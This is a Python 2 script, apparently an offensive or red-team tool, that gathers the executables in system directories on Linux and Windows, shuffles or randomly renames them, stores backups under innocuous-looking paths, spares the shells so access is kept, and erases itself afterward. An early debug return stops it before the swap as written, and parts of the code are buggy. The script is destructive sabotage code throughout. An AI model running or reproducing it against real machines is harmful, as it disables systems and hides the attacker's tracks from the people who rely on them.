#!/usr/bin/env python
from sys import exit, argv
import platform
import os
from random import choice
import itertools
from multiprocessing import Process
from pickle import dump, load
import shutil
from hashlib import md5

#TODO:
# 1. figure out what binaries are needed to login successfully so we don't swap those.
# 2. add a prompt to self erase after a revert, but timeout after like 5-10 seconds and
#	 default to no

operatingSystem = platform.system().lower() #detect OS
if operatingSystem == "windows": #set up some vars for specific OSes
	slash = "\\"
	dest = "C:\\Windows\\bin_locale" #directory where binaries will be backed up
	backfile = "C:\Windows\Globalization\Global.nls" #backup/revert file
else:
	slash = "/"
	dest = "/lib/lib-udev" #directory where binaries will be backed up
	backfile = "/var/local/opt" #backup/revert file

#print help
def help():
	print "-R, --random To randomly rename binaries instead of swapping them"
	print "-r, --revert To revert from disaster"

#swap two given values in a list
def swap(xs, a, b):
    xs[a], xs[b] = xs[b], xs[a]

#find one derangement of the given list, xs
def derange(xs):
	for a in xrange(1, len(xs)):
		b = choice(xrange(0, a))
		swap(xs, a, b)

#shuffle binaries
def shuffle(keys, oldDict, newDict):
	for key in keys:
		shutil.move(dest + oldDict[key], newDict[key])

#put the binaries back to where they should be
def unshuffle(oldDict, newDict):
	for key in newDict.keys():
		shutil.move(dest + newDict[key], oldDict[key])

#backup the binary files
def backup(myDict, directories, revert=0):
	cmd = ""
	if operatingSystem == "windows":
		mkdirBin = "mkdir"
	else: #linux!
		if revert:
			mkdirBin = "/var/mkdir"
		else: #if we're not reverting, make backups of python and mkdir
			cmd = ("/bin/cp `which mkdir` /var/mkdir;"
				   "/bin/cp `which python` /var/spool/python;")
			mkdirBin = "/usr/bin/env mkdir"

	cmd = cmd + "%s -p \"%s\";" % (mkdirBin, dest) #create initial backup dir

	for myDir in directories: #remake directory structure
		cmd = cmd + "%s -p \"%s%s\";" % (mkdirBin, dest, myDir)
		
	os.system(cmd) #create directories needed

	#should work cross platform
	for key, value in myDict.iteritems(): #backup the actual binaries
		shutil.copy(value, dest + value)

#get all files from the directories given and place them in a dictionary
def getFiles(directories):
	myDict = {}
	for myDir in directories: #traverse given dirs
		if os.path.isdir(myDir): #if dir exists traverse files in it
			for myBin in os.listdir(myDir):
				#if windows
				if operatingSystem == "windows":
					#if not an executable or if cmd or python, skip it
					if myBin[-4:] != ".exe" or myBin == "cmd.exe" or "python" in myBin:
						continue
				#if linux
				else: #if a shell, env or python, skip it
					if (myBin == "sh" or myBin == "bash" or myBin == "csh" or myBin == "zsh"
						or myBin == "env" or myBin == "tcsh" or myBin == "dash"
						or myBin == "ash" or "python" in myBin):
						continue

				fullBin = "%s%s%s" % (myDir, slash, myBin)
				if os.path.isfile(fullBin): #make sure it's a file not a dir
					myDict[myBin] = fullBin
				#not tested, but this should recurse through all directories which would be useful
				#for the "Program Files" directory. should look into this. might be bad for
				#C:\windows since that's a huge dir with a lot of dirs in it
				#elif operatingSystem == "windows":
				#	return getFiles([myBin])

	return myDict

#main binary swapping function
def binswap(rename=0):
	#pick directories based on OS
	if operatingSystem == "windows":
		dirs = ["C:\Windows", "C:\Windows\System32"]
	else:
		dirs = ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin"]

	#get the files into a dictionary
	oldDict = getFiles(dirs)

	#if just swapping, create backups of all the binaries so we can copy things properly
	#during the shuffle
	if not rename:
		backupThread = Process(target=backup, args=(oldDict,dirs,))
		backupThread.start()

	#create copy of dict and generate list of keys.
	newDict = oldDict.copy()
	oldKeys = oldDict.keys()

	if rename: #if randomly renaming binaries
		dest = "" #set dest to nothing since we won't be moving from the backup dir

		#loop through and change the values to be random in the newDict
		#the new random value will consist of a random combination of the beginning of the md5
		#hash of the string, the last two characters of that hash, then a random number (0,99)
		for myKey in oldKeys:
			keyHash = md5(myKey).hexdigest()
			newName = (keyHash[choice(range(0,2)):choice(range(5,7))] + keyHash[-2:]
							  + str(choice(range(0,99))))

			#get the full path before the binary name
			lastSlash = str.rfind(newDict[myKey], slash)
			newName = newDict[myKey][:lastSlash + 1] + newName

			if operatingSystem == "windows": #if windows, append .exe because file extensions
				newName = newName + ".exe"

			newDict[myKey] = newName
	else: #if swapping binaries
		#get a copy of the list of keys, then find a derangement of that
		newKeys = list(oldKeys)
		derange(newKeys)

		#shuffle the key:value pairs
		for oldKey, newKey in zip(oldKeys, newKeys):
			newDict[newKey] = oldDict[oldKey]

		#wait till thread is done and make sure it succeeded
		backupThread.join()
		if backupThread.exitcode != 0:
			print "backing up failed. exiting..."
			return(backupThread.exitcode)

	print newDict
	return 0

	#shuffle/rename the binaries!
	shuffleThread = Process(target=shuffle, args=(oldKeys, oldDict, newDict,))
	shuffleThread.start()

	#prepare for revert
	with open(backfile, 'wb') as outfile:
		dump([oldDict, newDict, rename], outfile)

	shuffleThread.join() #wait for shuffling to finish before ending
	os.system("echo > %s" % argv[0]) #self erase
	print "done swapping"
	return 0

#revert binaries back to original
def revert():
	#pick directories based on OS
	if operatingSystem == "windows":
		dirs = ["C:\Windows", "C:\Windows\System32"]
	else:
		dirs = ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin"]

	#grab oldDict, newDict and type of reversion from file
	if os.path.exists(backfile):
		with open(backfile, 'rb') as infile:
			oldDict, newDict, rename = load(infile)
	else:
		print "cannot find backup file, ya screwed"
		return 1

	#if we just renamed randomly, set dest to nothing bc we aren't moving binaries from that dir
	if rename:
		dest = ""
	else:#if we swapped, create copies of the binaries
		backup(oldDict, dirs, revert=1)

	#put binaries back in place
	unshuffle(oldDict, newDict)

	print "done reverting"
	return 0

if __name__ == "__main__":
	if len(argv) > 1: #check the arg if we have any
		#if they want to revert a previous action
		if argv[1] == "-r" or argv[1] == "--revert" or argv[1] == "revert" or argv[1] == "-revert":
			exit(revert())
		#if they want to randomly rename binaries
		elif argv[1] == "-R" or argv[1] == "--random" or argv[1] == "random" or argv[1] == "-random":
			exit(binswap(rename=1))
		elif "help" in argv[1]:
			help()
		else: #if arg didn't match, swap away!
			exit(binswap())
	else: #if no args, just swap!
		exit(binswap())
